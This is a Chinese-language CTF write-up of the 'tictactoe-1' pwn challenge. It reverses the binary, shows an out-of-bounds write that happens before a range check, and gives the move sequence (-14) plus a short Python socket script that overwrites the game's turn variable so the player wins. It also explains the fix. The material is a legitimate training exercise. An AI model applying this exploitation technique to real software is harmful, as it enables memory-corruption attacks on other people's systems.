# PHM #78 Pwn — tictactoe-1

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 50 |

## 題目

> Can you beat my tic-tac-toe AI? `nc ctf.hackme.quest 7714`
>
> Binary: [`/static/tictactoe.xz`](https://ctf.hackme.quest/static/tictactoe.xz)

## 分析

Binary: 32-bit ELF, canary on, stripped. 用的 AI 是 Matthew Steele 的 minimax ([gist 3158579](https://gist.github.com/MatthewSteel/3158579)). minimax 是完美 solver, 正面對弈最多平手, 不可能贏.

### 關鍵 bug: 玩家 move handler 的 OOB write

Reversed 的 move handler (大約 `0x8048a4b`):

```c
int move = atoi(input);
if (move == 9) {
    read(0, &flavor, 4);
    board_char = flavor[0];      // 改 player char
    return;
}
// BUG: 不檢查 move 範圍就寫
*(char*)(0x804b056 + move) = board_char;   // ← OOB!
if (is_valid(move)) {                       // 這個檢查 pos<0 || pos>8
    taken_map[move] = 0xFF;
}
```

`is_valid` 寫得正確 (`pos < 0 || pos > 8 → return 0`), **但 player char 的 write 在 is_valid 之前就無條件做了**. 送 move = -14 → `0x804b056 - 14 = 0x804b048`.

### `0x804b048` 是什麼?

.data 的 global vars:
```
0x804b048  current_player   (int32, 1=X turn, -1=O turn)
0x804b04c  player_char      ('X' = 0x58)
0x804b04d-055  taken_map    (9 bytes, 0=empty 0xFF=taken)
0x804b056-05e  display      (9 bytes, "012345678")
```

**current_player 就在 OOB 可達位置**. Game loop 的判斷:

```c
if (current_player == -1) ai_move();     // AI 回合
else                     player_move();  // 玩家回合
current_player = -current_player;        // toggle
```

→ 寫 'X' (0x58) 到 `current_player` 的 low byte, 整個 int 變成 `0x00000058 = 88`. 88 ≠ -1, 永遠走 player 分支. toggle 之後 -88 ≠ -1, 還是 player 分支. **AI 永遠拿不到回合**, player 可以連下.

## 解法

```
送 "1"   # 選先手
送 "0"   # X 下 0
     (AI 下中間)
送 "-14" # OOB 寫 'X' 到 current_player → 永遠 player turn
送 "1"   # X 下 1
送 "2"   # X 下 2, 頂行 3 連 → 贏
```

Python:

```python
import socket, time
s = socket.create_connection(('ctf.hackme.quest', 7714))
for m in ['1', '0', '-14', '1', '2']:
    time.sleep(0.5)
    s.send((m + '\n').encode())
# recv all
...
```

## Flag

```
FLAG{OOB write? it's too easy for a pwn challenage! Get a shell pls}
```

## 感想

標題明示「too easy」, 意思是這題只有 50 分, 真正難的 shell 在 [#79 tictactoe-2](tictactoe-2.md). 但 OOB write 的 trick 確實很乾淨:

- `is_valid` 擋了「marking taken map」的 OOB
- **沒**擋 player char 的 write
- 全靠**先寫後驗**這個順序 bug

修法: 先 is_valid 再 write. 或是用 `unsigned` + range check 代替 signed int.

### 跟 #67 smashthestack 的對照

兩題都是 PWN 但繞法完全不碰 shellcode / ROP:
- #67 smashthestack 靠 `__stack_chk_fail` 噴 argv[0] 把 flag printf 出來
- #78 tictactoe-1 靠 OOB write 把 game state 搞壞讓玩家連下

共通點: **程式自己有一個會印 flag 的 branch**, 攻擊只是「想辦法走到那條 branch」, 不用控制 EIP.
